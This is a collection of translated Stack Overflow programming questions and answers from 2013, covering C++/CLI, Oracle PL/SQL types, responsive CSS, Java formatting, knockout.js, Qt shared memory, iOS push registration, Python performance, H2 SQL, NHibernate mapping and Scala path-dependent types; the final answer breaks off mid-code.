我有编译错误。

我在上一篇文章中读到“尝试`onClick`在 .cpp 文件中声明你的主体”。问题是......我不确定我应该在 .cpp 文件中究竟放什么？

感谢您的时间; 非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:53:53.350

您可以在使用之前简单地放置函数的原型。

```
bool function();
void whatever::button_click()
{
    bool result = function();
} 
```

如果您不希望它在函数之外可见，您甚至可以将原型放入函数中：

```
void whatever::button_click()
{
    bool function();
    bool result = function();
} 
```

当然，如果 .cpp 文件中的函数与原型不匹配，则会出现**链接器**错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:16:36.167

我认为这里的问题是你不明白为什么一切都是 c++ 世界中的样子。假设您想创建一个具有函数 Bar 的 Foo 类，您只需执行此操作非常简单

```
class Foo
{
    void Bar(){/*code*/}
}; 
```

现在你在一个文件中有 Foo 类，但你还需要一个必须在另一个文件中的 Baz 类。你不能移动 Foo，所以 C++ 有#include 系统。这样，您可以将 Foo 放在一个文件中，将 Baz 放在另一个文件中，并且仍然可以同时使用它们。一个理论上的例子可能是：

```
#include "Foo.h"
class Baz
{
     Foo* foo;
}; 
```

编译器会这样翻译（现在考虑 Foo.h 包含我之前写的内容）：

```
class Foo
{
    void Bar(){/*code*/}
}; 

class Baz
{
     Foo* foo;
}; 
```

但是由于多种原因，这是非常低效的，首先，如果我们保留这样的所有内容，那么每次您在其他地方#included 文件时，编译器都必须编译相同的内容，因此 C++ 有另一种机制可以让您告诉类 Foo 存在于其他地方的编译器，它将在未来可用，它看起来有点像这样，所以当你在 C++ 中创建一个类时，你使用 .h 文件来描述它的外观并将实现保留在 cpp文件。在这种情况下，它看起来像这样：

```
//Foo.h

class Foo
{
    void Bar();
}; 

//Foo.cpp
#include "Foo.h"
void Foo::Bar(){/*code*/}

//Baz
#include "Foo.h"
class Foo
{
    void Bar(){/*code*/}
}; 
```

所以 TLDR，您需要做的是删除函数定义，将其保留为

```
private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e); 
```

并且在cpp文件中有

```
System::Void Form1::button1_Click(System::Object^  sender, System::EventArgs^  e) 
{
    bool result = function();
} 
```

# oracle - 尝试在 Oracle 中使用 UDT 执行存储过程时出现“对未初始化组合的引用”

> ID：15510170
> 
> 赞同：0
> 
> 时间：2013-03-19T20:50:11.523
> 
> 标签：oracle, stored-procedures, package, user-defined-types

有这个包，我正在尝试使用下面的代码执行。但是我收到一个错误

> ORA-06530: 对未初始化复合的引用

代码：

```
DECLARE
   StudyNum    InputTyp := InputTyp ();
   StudyDetails   OutputTyp := OutputTyp ();
BEGIN
   StudyNum.EXTEND;
   StudyNum (1) := '9071';
   my_package.my_procedure(StudyNum, StudyDetails);
END;
/ 
```

该包创建如下，用户定义的数据类型作为输入和输出参数：

```
Create OR REPLACE Type InputTyp  AS VARRAY(200) OF VARCHAR2 (1000);
CREATE  TYPE OBJTYP AS OBJECT
(
    A            NUMBER,
    B             VARCHAR2 (1000),       
    C        VARCHAR2 (100)       
);
CREATE TYPE OutputTyp IS VARRAY (2000) OF   OBJTYP;
/

CREATE OR REPLACE PACKAGE my_package
AS
    PROCEDURE my_procedure(p_StudyNum IN InputTyp,p_StdyDtl OUT OutputTyp);
END my_package;
/
CREATE OR REPLACE PACKAGE BODY my_package
AS
   PROCEDURE my_procedure(p_StudyNum IN InputTyp,p_StdyDtl OUT OutputTyp)
IS
    i            BINARY_INTEGER := 1;
    j            BINARY_INTEGER := 1;
   CURSOR c_StudyTbl
   IS
     SELECT A,  B, C
     FROM my_table
     WHERE Study_Number = p_StudyNum(i);

  v_StudyTbl   OBJTYP;
BEGIN
    p_StdyDtl := OutputTyp ();
    LOOP
 --  This is the first cursor opened for each of the items in the list.
  EXIT WHEN i > p_StudyNum.count;

 OPEN c_StudyTbl;
 LOOP

    FETCH c_StudyTbl INTO v_StudyTbl;
    EXIT WHEN c_StudyTbl%NOTFOUND;

    p_StdyDtl.EXTEND ();
    p_StdyDtl (j).A := v_StudyTbl.A;
    p_StdyDtl (j).B := v_StudyTbl.B;
    p_StdyDtl (j).C := v_StudyTbl.C;
    j := j + 1;
 END LOOP;
 CLOSE c_StudyTbl;
i := i + 1;
END LOOP;

IF c_StudyTbl%ISOPEN
THEN
   CLOSE c_StudyTbl;
END IF;
EXCEPTION
WHEN NO_DATA_FOUND
THEN
   NULL;
END;
END my_package;
/ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:12:36.243

你要么需要做：

```
p_StdyDtl(p_StdyDtl.last) := OBJTYP(null, null, null);
p_StdyDtl (j).A := v_StudyTbl.A;
p_StdyDtl (j).B := v_StudyTbl.B;
p_StdyDtl (j).C := v_StudyTbl.C; 
```

或更简单：

```
p_StdyDtl(j) := OBJTYP(v_StudyTbl.A, v_StudyTbl.B, v_StudyTbl.C); 
```

您的代码原样失败，因为您已初始化`OutputTyp`但未初始化`objtyp`部分。

但正如我在[你之前的问题中](https://stackoverflow.com/questions/15503720/pls-00386-type-mismatch-found-between-fetch-cursor-and-into-variables)所说的那样，`multiset`避免了所有这些。

# javascript - 如何使网站无响应？

> ID：15510172
> 
> 赞同：2
> 
> 时间：2013-03-19T20:50:16.330
> 
> 标签：javascript, css, html, responsive-design

我目前正在开发一个响应式样式表，该样式表目前正在运行，但在非桌面设备上看起来很可怕，因为它正在进行中。

是否可以使用一些 JavaScript 来强制在每个设备上加载桌面布局，而不管视口大小如何？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T20:52:54.667

把它加到你的头上

```
<meta name="viewport" content="width=SITE_MIN_WIDTH, initial-scale=1, maximum-scale=1"> 
```

请务必使用站点的最小宽度更改 SITE_MIN_WIDTH。这应该迫使设备加载到正确的尺寸。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:57:45.823

听起来您想使用 JavaScript 禁用某些媒体查询。

据我所知，不，你不能这样做。

您可以执行以下操作，尽管它非常迂回：

1.  向`<html>`标签添加一个类，例如`responsive`

2.  为所有当前无法与该类一起工作的 CSS 块添加前缀，以便它们仅在该类存在时应用。

3.  `<html>`在页面加载时，使用 JavaScript 从标记中删除该类。

但是，据推测，在您正在编码的设备上检查它们时，您可能需要一种方法来重新打开它们。否则，为什么首先将它们放在您的实时站点上？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:01:35.823

媒体查询只是根据当前分辨率调用不同的 CSS 文件。

如果它是移动优先响应的，它会从较小尺寸的屏幕开始并逐渐增加。编辑您的 CSS 并删除任何影响小于桌面的屏幕的 CSS 应该可以解决问题。但是，不确定您使用的是哪个系统，该站点已经构建并且您需要禁用。他们可能有数百种方法来做到这一点。我不知道 OP 是什么，但我建议编辑你的 CSS 文件。您应该能够通过在 Firefox 上使用 Firebug 找到正在加载的 CSS。

# java - 设置双精度格式

> ID：15510177
> 
> 赞同：-2
> 
> 时间：2013-03-19T20:50:43.193
> 
> 标签：java, android, double, converter

如何设置输出格式`lat`，`lng`如下所示：`0.000000`？

```
 double lat = marker.getPosition().latitude;
  double lng = marker.getPosition().longitude; 
```

最好不要转换为 a `String`，以便输出是 a `double`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:01:09.157

Java 中的数字没有任何与它们相关的输出格式。要完全输出它们，它们会被转换为 a `String`，即使您调用`System.out.println(marker.getPosition().latitude)`.

可以`double`像任何数字一样格式化 a ，但仅限于转换为 a 时`String`。

您可以使用[`DecimalFormat`](http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html)：

```
DecimalFormat df = new DecimalFormat("0.000000");
String formattedLat = df.format(marker.getPosition().latitude); 
```

（这`0`是必要的，而不是`#`显示尾随零。）

也可以使用[String.format()](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html)。

`String`但是如果要格式化数字，则必须转换为 a 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T20:58:47.967

[您可以尝试使用DecimalFormat](http://docs.oracle.com/javase/1.4.2/docs/api/java/text/DecimalFormat.html)将此方法舍入到小数点后 6 位

```
double roundDecimals(double d) {
    DecimalFormat twoDForm = new DecimalFormat("0.000000"); 
    return Double.valueOf(twoDForm.format(d));
} 
```

像这样使用：

```
double lat = roundDecimals(marker.getPosition().latitude);
double lng = roundDecimals(marker.getPosition().longitude); 
```

@TronicZomB 发布的链接有更多相关信息，值得一读。

# jquery - 为敲除“if”绑定添加效果

> ID：15510178
> 
> 赞同：4
> 
> 时间：2013-03-19T20:50:44.410
> 
> 标签：jquery, knockout.js

我在 knockout.js 文档中找到了有关如何在切换可见绑定甚至使用“foreach”绑定的 beforeRemove 事件时添加 jquery 效果的示例。

但是，我还没有发现如何在切换“if”绑定时添加 jquery 效果

考虑以下代码：

```
<table data-bind="with: myModel">
 <tr data-bind="if: IsVisible">
<td>some string</td>
 </tr>
</table> 
```

当 IsVisible 返回 true 时，我将如何添加 jquery fadeIn 效果？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:33:57.230

您不能`if`直接使用绑定，但在绑定中使用自定义绑定`if`可以解决问题：

```
<table data-bind="with: myModel">
    <tr data-bind="if: IsVisible">
        <!--ko fadeIn: true-->
        <td>some string</td>
        <!--/ko-->
    </tr>
</table> 
```

处理程序：

```
ko.bindingHandlers.fadeIn = {
    init: function(element) {
        $(ko.virtualElements.childNodes(element))
            .filter(function () { return this.nodeType == 1; })
            .hide()
            .fadeIn();
    }
};
ko.virtualElements.allowedBindings.fadeIn = true; 
```

示例：http: [//jsfiddle.net/mbest/fpnTH/](http://jsfiddle.net/mbest/fpnTH/)

# qt - 几次成功写入后的 Qt QSharedMemory 分段错误

> ID：15510184
> 
> 赞同：1
> 
> 时间：2013-03-19T20:51:07.577
> 
> 标签：qt, shared-memory, qtembedded

我正在使用 QSharedMemory 存储一些数据，并希望随后将数据附加到其中包含的内容。所以我用新数据多次调用以下代码。“audioBuffer”是给这个函数的新数据。在 memcpy 操作出现故障之前，我可以调用这个函数大约 4-7 次（它会有所不同）。QSharedMemory 位置的大小很大，因此在我在段错误之前进行的几次调用中，没有 memcpy 复制数据超出其边界的问题。此外， m_SharedAudioBuffer.errorString() 不会对 memcpy 操作产生任何错误。目前，我只有一个使用这个 QSharedMemory 段的进程。我还尝试在不每次都追加的情况下连续写入并且效果很好，因此当我尝试将更多数据追加到共享内存段时发生了一些事情。有任何想法吗？谢谢！

```
 // Get the buffer size for the current audio buffer in shared memory
    int bufferAudioDataSizeBytes = readFromSharedAudioBufferSizeMemory(); // This in number of bytes

    // Create a bytearray with our data currently in the shared buffer
    char* bufferAudioData = readFromSharedAudioBufferMemory();
    QByteArray currentAudioStream = QByteArray::fromRawData(bufferAudioData,bufferAudioDataSizeBytes);
    QByteArray currentAudioStreamDeepCopy(currentAudioStream);

    currentAudioStreamDeepCopy.append(audioBuffer);
    dataSize = currentAudioStreamDeepCopy.size();

    //#if DEBUG
    qDebug() << "Inserting audio buffer, new size is: " << dataSize;
    //#endif

    writeToSharedAudioBufferSizeMemory( dataSize ); // Just the size of what we received

    // Write into the shared memory
    m_SharedAudioBuffer.lock();

    // Clear the buffer and define the copy locations
    memset(m_SharedAudioBuffer.data(), '\0', m_SharedAudioBuffer.size());
    char *to = (char*)m_SharedAudioBuffer.data();
    char *from = (char*)audioBuffer.data();

    // Now perform the actual copy operation to store the buffer
    memcpy( to, from, dataSize );

    // Release the lock
    m_SharedAudioBuffer.unlock(); 
```

编辑：也许，这是由于我的目标嵌入式设备非常小。当我尝试写入共享内存时，可用 RAM 很大，但我注意到在 /tmp 目录（仅给出 4Mb ）中我有以下条目 - 虽然 /tmp 中几乎没有消耗大小所以我'我不知道为什么我不能分配更多的内存，QSharedMemory::create 方法也不会因为我的最大大小 960000 失败：

```
# cd /tmp/
# ls
QtSettings
lib
qipc_sharedmemory_AudioBufferData2a7d5f1a29e3d27dac65b4f350d76a0dfd442222
qipc_sharedmemory_AudioBufferSizeData6b7acc119f94322a6794cbca37ed63df07b733ab
qipc_systemsem_AudioBufferData2a7d5f1a29e3d27dac65b4f350d76a0dfd442222
qipc_systemsem_AudioBufferSizeData6b7acc119f94322a6794cbca37ed63df07b733ab
qtembedded-0
run 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T18:30:29.383

问题似乎是我在共享内存段返回的指针上使用了 QByteArray 的 ::fromRawData。当我在此指针上使用 memcpy 显式复制该数据，然后使用复制的数据构造我的 QByteArray 时，段错误停止了。

# ios - 在用户允许 iOS 上的通知之前调用 APNS didRegisterForRemoteNotifications

> ID：15510190
> 
> 赞同：8
> 
> 时间：2013-03-19T20:51:25.583
> 
> 标签：ios, apple-push-notifications

我正在开发一些 iOS 应用程序，它们都属于同一个发布者，都启用了推送通知。当我打电话时`registerForRemoteNotificationTypes`，我会提示用户允许或禁止推送通知，但在用户选择选项*之前*`application:didRegisterForRemoteNotificationsWithDeviceToken:`，我会使用令牌数据进行调用。当他们按 OK 时，它会再次被调用。这是正常的吗？

 *另请注意：多个应用程序在同一设备上运行时似乎获得相同的令牌。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T16:42:10.273

这是来自 Apple 文档。

> 当您发送此消息时，设备将启动 Apple Push Service 的注册过程。如果成功，则应用程序委托在 application:didRegisterForRemoteNotificationsWithDeviceToken: 方法中接收设备令牌；如果注册不成功，则通过 application:didFailToRegisterForRemoteNotificationsWithError: 方法通知委托。如果应用程序委托接收到设备令牌，它应该与其提供者连接并将令牌传递给它。

和

> 启用推送的应用第一次注册推送通知时，iOS 会询问用户是否希望接收该应用的通知。一旦用户对此警报做出响应，除非设备已恢复或应用程序已卸载至少一天，否则它不会再次显示。

我认为你所观察到的是正常的。没有提及`application:didRegisterForRemoteNotificationsWithDeviceToken` 只有在用户授予权限时才会调用。我认为您可以通过在 NSUserDefaults 中缓存设备令牌来优化它，并在此方法中检查新令牌是否不等于缓存令牌。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-01-13T18:08:00.667

这是一个老问题，但我刚刚遇到这个问题，它似乎与远程通知后台模式有关。`application:didRegisterForRemoteNotificationsWithDeviceToken`仅在打开此后台模式时在接受推送通知权限之前在我的 iPhone 上调用。*

# python - 可以在 Python 中更快地对可变长度迭代进行简单计算吗？

> ID：15510193
> 
> 赞同：5
> 
> 时间：2013-03-19T20:51:40.487
> 
> 标签：python, python-2.7

我正在计算由元组表示的两个向量之间的欧几里得距离。

```
(u[0]-v[0])**2 + (u[1]-v[1])**2 + (u[3]-v[3])**2 ... 
```

执行此操作的硬编码方式非常快。但是，我不想对这些向量的长度做任何假设。这会产生如下解决方案：

```
sum([(a-b)**2 for a, b in izip(u, v)]) # Faster without generator 
```

或者

```
sum = 0
for i in xrange(len(u)):
    sum += (u[i]-v[i])**2 
```

结果比第一个版本慢得多（至少两倍）。有没有一些聪明的方法来优化这个，**而不求助于 NumPy/SciPy？**我知道这些包提供了最快的方式来做这些事情，但目前，我更想获得优化“裸 Python”的经验。我发现快速有效的是动态构建一个定义函数及其的字符串`exec()`，但这真的是最后的手段，我会说......

要求：

*   CPython 2.7
*   仅标准库
*   “真实”（例如 no `exec()`），纯 Python

尽管我的问题是关于一般小操作的问题，但您可能会在您的解决方案中假设其中一个向量在多个函数调用中保持不变。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:50:55.250

```
mysum = 0
for a, b in izip(u, v) :
    mysum += (a-b)**2 
```

比#3 快大约 35%

PS：您是否尝试过[Cython](http://www.cython.org/)（不是 CPython）或[Shedskin](https://code.google.com/p/shedskin/)？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-25T16:27:53.567

我的理解是你并不真的需要让代码更快，你只是想知道为什么它更慢。为了回答这个问题，让我们看一下反汇编。出于本次讨论的目的，我将在函数调用中包装每个方法，在每次反汇编中可以忽略 and 的加载和返回命令`u`。`v`

```
def test1(u, v):
    return (u[0]-v[0])**2 + (u[1]-v[1])**2 + (u[3]-v[3])**2

dis.dis(test1)
 0 LOAD_FAST                0 (u)
 3 LOAD_CONST               1 (0)
 6 BINARY_SUBSCR       
 7 LOAD_FAST                1 (v)
10 LOAD_CONST               1 (0)
13 BINARY_SUBSCR       
14 BINARY_SUBTRACT     
15 LOAD_CONST               2 (2)
18 BINARY_POWER        
19 LOAD_FAST                0 (u)
22 LOAD_CONST               3 (1)
25 BINARY_SUBSCR       
26 LOAD_FAST                1 (v)
29 LOAD_CONST               3 (1)
32 BINARY_SUBSCR       
33 BINARY_SUBTRACT     
34 LOAD_CONST               2 (2)
37 BINARY_POWER        
38 BINARY_ADD          
39 LOAD_FAST                0 (u)
42 LOAD_CONST               4 (3)
45 BINARY_SUBSCR       
46 LOAD_FAST                1 (v)
49 LOAD_CONST               4 (3)
52 BINARY_SUBSCR       
53 BINARY_SUBTRACT     
54 LOAD_CONST               2 (2)
57 BINARY_POWER        
58 BINARY_ADD          
59 RETURN_VALUE 
```

我将第一个示例剪掉了 3 的长度，因为它只会一遍又一遍地重复相同的模式。您可以很快看到没有函数调用开销，并且解释器几乎在这些操作数上做了尽可能少的工作来实现您的结果。

```
def test2(u, v):
    sum((a-b)**2 for a, b in izip(u, v))

dis.dis(test2)
 0 LOAD_GLOBAL              0 (sum)
 3 LOAD_CONST               1 (<code object <genexpr> at 02C6F458, file "<pyshell#10>", line 2>)
 6 MAKE_FUNCTION            0
 9 LOAD_GLOBAL              1 (izip)
12 LOAD_FAST                0 (u)
15 LOAD_FAST                1 (v)
18 CALL_FUNCTION            2
21 GET_ITER            
22 CALL_FUNCTION            1
25 CALL_FUNCTION            1
28 RETURN_VALUE 
```

我们在这里看到的是，我们从生成器表达式中创建了一个函数，加载了 2 个全局变量（sum 和 izip，全局查找比本地查找慢，我们无法避免只创建一次，但如果要调用它们一个紧密的循环，许多人将它们分配给一个本地，例如`_izip`or `_sum`)，然后连续遭受 4 次昂贵的字节码操作，调用 izip，从生成器中获取迭代器，调用生成器创建的函数，然后调用sum 函数（它将消耗迭代器并在返回之前添加每个项目）。

```
def test3(u, v):
    sum = 0
    for i in xrange(len(u)):
        sum += (u[i]-v[i])**2

dis.dis(test3)
 0 LOAD_CONST               1 (0)
 3 STORE_FAST               2 (sum)

 6 SETUP_LOOP              52 (to 61)
 9 LOAD_GLOBAL              0 (xrange)
12 LOAD_GLOBAL              1 (len)
15 LOAD_FAST                0 (u)
18 CALL_FUNCTION            1
21 CALL_FUNCTION            1
24 GET_ITER            
25 FOR_ITER                32 (to 60)
28 STORE_FAST               3 (i)

31 LOAD_FAST                2 (sum)
34 LOAD_FAST                0 (u)
37 LOAD_FAST                3 (i)
40 BINARY_SUBSCR       
41 LOAD_FAST                1 (v)
44 LOAD_FAST                3 (i)
47 BINARY_SUBSCR       
48 BINARY_SUBTRACT     
49 LOAD_CONST               2 (2)
52 BINARY_POWER        
53 INPLACE_ADD         
54 STORE_FAST               2 (sum)
57 JUMP_ABSOLUTE           25
60 POP_BLOCK           
61 LOAD_CONST               0 (None)
64 RETURN_VALUE 
```

我们在这里看到的是`test2`. 没有生成器表达式或求和调用，但我们已经用不必要的函数调用替换了函数调用开销，`xrange(len(u))`而不是 @Lucas Malor 建议的更快的解决方案。

```
def test4(u, v):
    mysum = 0
    for a, b in izip(u, v) :
        mysum += (a-b)**2
    return mysum

dis.dis(test4)
 0 LOAD_CONST               1 (0)
 3 STORE_FAST               2 (mysum)

 6 SETUP_LOOP              47 (to 56)
 9 LOAD_GLOBAL              0 (izip)
12 LOAD_FAST                0 (u)
15 LOAD_FAST                1 (v)
18 CALL_FUNCTION            2
21 GET_ITER            
22 FOR_ITER                30 (to 55)
25 UNPACK_SEQUENCE          2
28 STORE_FAST               3 (a)
31 STORE_FAST               4 (b)

34 LOAD_FAST                2 (mysum)
37 LOAD_FAST                3 (a)
40 LOAD_FAST                4 (b)
43 BINARY_SUBTRACT     
44 LOAD_CONST               2 (2)
47 BINARY_POWER        
48 INPLACE_ADD         
49 STORE_FAST               2 (mysum)
52 JUMP_ABSOLUTE           22
55 POP_BLOCK           

56 LOAD_FAST                2 (mysum)
59 RETURN_VALUE 
```

以上代表@Lucas Malor 的贡献，它在某些方面更快。它用解包替换下标操作，同时将调用次数减少到 1。在许多情况下，这与您在给我们的约束条件下实现的速度一样快。

请注意，如果您要调用该函数的次数足够多以承受开销，那么只值得`eval`使用类似于 test1 中的函数的运行时生成的字符串。另请注意，随着 u 和 v 的长度变得越来越大（这通常是评估此类算法的方式），其他解决方案的函数调用开销变得越来越小，因此，在大多数情况下，最易读的解决方案要优越得多. 同时，即使在小情况下速度较慢，但​​如果序列 u 和 v 的长度可能很长，我建议使用生成器表达式而不是列表推导式。在大多数情况下，内存节省将导致更快的执行（和更快的 gc）。

总的来说，我的建议是，在短序列情况下的微小加速不值得增加代码大小和与您通过执行微优化查看的其他 python 实现不一致的行为。“最佳”解决方案几乎可以肯定是`test2`.

# sql - 一次查询选择独立不同

> ID：15510194
> 
> 赞同：2
> 
> 时间：2013-03-19T20:51:48.887
> 
> 标签：sql, distinct, h2, multiple-columns

我需要从[h2](http://www.h2database.com/html/main.html)数据库中的多个列中选择不同的值，以便我可以根据数据库中的内容为用户提供建议列表。换句话说，我需要类似的东西

```
SELECT DISTINCT a FROM table
SELECT DISTINCT b FROM table
SELECT DISTINCT c FROM table 
```

在一个查询中。万一我不够清楚，我想要一个给定这个表的查询（列 ID、事物、其他、事物）

```
0 a 5 p
1 b 5 p
2 a 6 p
3 c 5 p 
```

会导致这样的事情

```
a 5 p
b 6 -
c - - 
```

其中“-”是一个空条目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:00:08.107

这有点复杂，但您可以按如下方式进行：

```
select max(thing) as thing, max(other) as other, max(stuff) as stuff
from ((select row_number() over (order by id) as seqnum, thing, NULL as other, NULL as stuff
       from (select thing, min(id) as id from t group by thing
            ) t
      ) union all
      (select row_number() over (order by id) as seqnum, NULL, other, NULL
       from (select other, min(id) as id from t group by other
            ) t
      ) union all
      (select row_number() over (order by id) as seqnum, NULL, NULL, stuff
       from (select stuff, min(id) as id from t group by stuff
            ) t
      )
     ) t
group by seqnum 
```

这样做是为每列中的每个不同值分配一个序列号。然后，它将这些组合到每个序列号的单行中。该组合使用`union all`/`group by`方法。另一种配方使用`full outer join`.

此版本使用`id`列将值保持在与它们在原始数据中出现的顺序相同的顺序。

在 H2 中（最初不是问题），您可以改用该`rownum()`函数（[在此处](https://groups.google.com/forum/?fromgroups=#!topic/h2-database/jqrZ6Ys8Bd0)记录）。但是，您可能无法指定排序。

# nhibernate - 如何在 NHibernate 中引用关系的类和 Id 属性

> ID：15510198
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:01.087
> 
> 标签：nhibernate, mapping, foreign-key-relationship

考虑这两个类之间的关系

```
public class Order
{
  public int OrderId {get;set;}
  public int CustomerId {get;set;}  // Should this be here?
  public Customer Customer{get;set}
}

public class Customer
{
  public int CustomerId {get;set;}
  public string Name {get;set;}
} 
```

我知道我不需要**Order上的****CustomerId**属性，并且我同意这不是最漂亮的 OO 做事方式。只有 Customer 属性，我可以轻松地请求**Order.Customer.CustomerId**来获取客户的 ID。

 ****但在这种情况下，NHibernate 将触发对数据库的请求以加载该客户，并且有一些（实际上很多）情况我只需要**Order**的**CustomerId**。在这种情况下，**Order类中的****CustomerId**将很有用，并且需要更少的访问数据库。（*如果我对此有误，请纠正我*）。

 *********问题 1**：有没有办法告诉 NHibernate 我希望这两个属性总是更新？

属性**CustomerId**将始终具有客户的 Id，并且只有在我愿意时才会由惰性加载属性**Customer**（假设获取客户的姓名）。Microsoft Entity Framework 允许这样做。

**问题2**：如果不可能，我应该担心这个吗？

**更新**

按照答案说明，我做了一个测试，试图检查为什么（在我的情况下）NHibernate 没有按预期工作，并发现了一些有趣的东西：如果***我不使用 Accessor****，NHibernate 默认不会在 Order.Customer.CustomerId 访问数据库。**映射**CustomerId 属性的字段。*

使用默认访问器，它可以按预期工作。知道为什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:13:46.693

NHibernate 的默认行为是仅在访问 Id 时不加载对象。另一个问题已经回答了这个[问题](https://stackoverflow.com/questions/10084553/get-id-for-a-lazy-many-to-one-object-withot-database-acces)，我在下面引用了这个问题。

**如果您`A`从数据库中检索然后访问`A.B.Id`这将不会命中数据库。如果您访问除 Id 字段之外的任何其他属性，它将导致 NHibernate 从数据库中检索 B。**

因此，总而言之，调用`Order.Customer.CustomerId`不会触发 NHibernate 来查询数据库以获取客户表中的行，`CustomerId`因此最好从您的 Order 类中删除 CustomerID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T04:39:03.150

Only one property can be writable. I suggest mapping of both like this (we are using this approach):

Class

```
public int CustomerId {get;set;}  // Should this be here?
public Customer Customer{get;set} // Answer: yes 
```

Mapping

```
<many-to-one name="Customer" column="CustomerId"  />
<property  name="CustomerId" column="CustomerId" insert="false" update="false" /> 
```

Now you can manipulate with both properties in *Read* operations the same way (e.g. filtering). The bidning of the detached Order must set the `Customer`, while `CustomerId` is read only.

So for write operations, you can (and you should) use only one property.

The benefit is, that if you need to filter only by *Customer* `ID`, you do not have to manipulate the Customer (object, table) at all.***********

# scala - 路径依赖类型和嵌套特征

> ID：15510202
> 
> 赞同：13
> 
> 时间：2013-03-19T20:52:17.140
> 
> 标签：scala, types, nested-class, path-dependent-type, dependent-method-type

## 背景

假设我有一些嵌套的特征：

```
trait Foo { trait Bar } 
```

还有几个例子：

```
val myFoo = new Foo {}
val myBar = new myFoo.Bar {} 
```

我可以编写以下内容，看起来（至少乍一看）他们应该或多或少地做同样的事情：

```
def whatever1(foo: Foo)(bar: foo.Bar) = bar
def whatever2(foo: Foo): foo.Bar => foo.Bar = { bar => bar }
def whatever3(foo: Foo) = new { def apply(bar: foo.Bar) = bar }
case class whatever4(foo: Foo) { def apply(bar: foo.Bar) = bar }
case class whatever5[F <: Foo](foo: F) { def apply(bar: foo.Bar) = bar } 
```

请注意，最后一个是受到[此处](https://groups.google.com/d/msg/scala-internals/p_qcbCp9Pkg/Pmq5pIqsojwJ)给出的解决方案的启发。

前三项工作：

```
scala> val sameBar1: myFoo.Bar = whatever1(myFoo)(myBar)
sameBar1: myFoo.Bar = $anon$1@522f63e7

scala> val sameBar2: myFoo.Bar = whatever2(myFoo)(myBar)
sameBar1: myFoo.Bar = $anon$1@522f63e7

scala> val sameBar3: myFoo.Bar = whatever3(myFoo)(myBar)
sameBar2: myFoo.Bar = $anon$1@522f63e7 
```

但不是第四个或第五个：

```
scala> val sameBar4: myFoo.Bar = whatever4(myFoo)(myBar)
<console>:12: error: type mismatch;
 found   : myFoo.Bar
 required: _1.foo.Bar where val _1: whatever4
       val sameBar4: myFoo.Bar = whatever4(myFoo)(myBar)
                                                  ^ 
```

很公平——我们也不能做以下事情，可能是出于类似的原因：

```
scala> val myOof = myFoo
myOof: Foo = $anon$1@39e4ff0c

scala> val myOofBar: myOof.Bar = new myFoo.Bar {}
<console>:10: error: type mismatch;
 found   : myFoo.Bar
 required: myOof.Bar
       val myOofBar: myOof.Bar = new myFoo.Bar {}
                                 ^ 
```

无论如何，这没什么大不了的，因为我们有三个可行的解决方案。

## 问题

（我首先要注意，虽然我在使用宏时第一次遇到下面的问题，虽然我的示例涉及反射 API，但我的问题并不特定于宏或反射。）

假设我正在使用新的反射 API 并希望能够编写以下内容：

```
applier[List[_]](Literal(Constant(42)), Literal(Constant(13))) 
```

它的意思是“给我抽象语法树`List(42, 13)`”之类的东西。这并不难——我可以使用`whatever3`上面的方法：

```
trait ReflectionUtils {
  import scala.reflect.api.Universe

  def companionApplier(u: Universe) = new {
    def apply[A: u.TypeTag](xs: u.Tree*): u.Tree = u.Apply(
      u.Select(u.Ident(u.typeOf[A].typeSymbol.companionSymbol), "apply"),
      xs.toList
    )
  }
} 
```

现在我在宏中得到了我想要的语法（请参阅我对[这个问题的](https://stackoverflow.com/q/15329027/334519)[回答](https://gist.github.com/travisbrown/5136824)以获取更详细和更有启发性的示例）：

```
object MacroExample extends ReflectionUtils {
  import scala.language.experimental.macros
  import scala.language.reflectiveCalls
  import scala.reflect.macros.Context

  def threeOfThem(n: Int) = macro threeOfThem_impl
  def threeOfThem_impl(c: Context)(n: c.Expr[Int]) = {
    val applier = companionApplier(c.universe)

    c.Expr[List[Int]](applier[List[_]](n.tree, n.tree, n.tree))
  }
} 
```

一切都按预期工作。不过，我不太喜欢“结构类型成员的反射访问”业务。不幸的是，我不能在这里使用`whatever1`or`whatever2`方法，因为当我将这个东西应用到我的宇宙时，我无法修复类型参数。我希望能够编写以下内容：

```
case class companionApplier(u: Universe) {
  def apply[A: u.TypeTag](xs: u.Tree*): u.Tree = u.Apply(
    u.Select(u.Ident(u.typeOf[A].typeSymbol.companionSymbol), "apply"),
    xs.toList
  )
} 
```

但这当然会让我遇到我们在`whatever4`上面看到的类型不匹配问题。

我还缺少其他技巧吗？我是否可以在不使用具有结构类型成员的匿名类的情况下获得我想要的语法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:12:11.787

这应该有效：

```
case class companionApplier[U <: Universe](u: U) { ... }

// in macro
companionApplier[c.universe.type](c.universe) 
```

几个月前我有一个类似的问题，请参见[此处](https://stackoverflow.com/questions/11612198/macros-path-dependent-type-inference-confusion)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T22:38:08.427

如何将结构类型拆分为辅助类型，然后从列表中撒一些我的解决方案，

```
scala> trait Foo { trait Bar }
defined trait Foo

scala> val myFoo = new Foo {} ; val myBar = new myFoo.Bar {}
myFoo: Foo = $anon$1@11247416
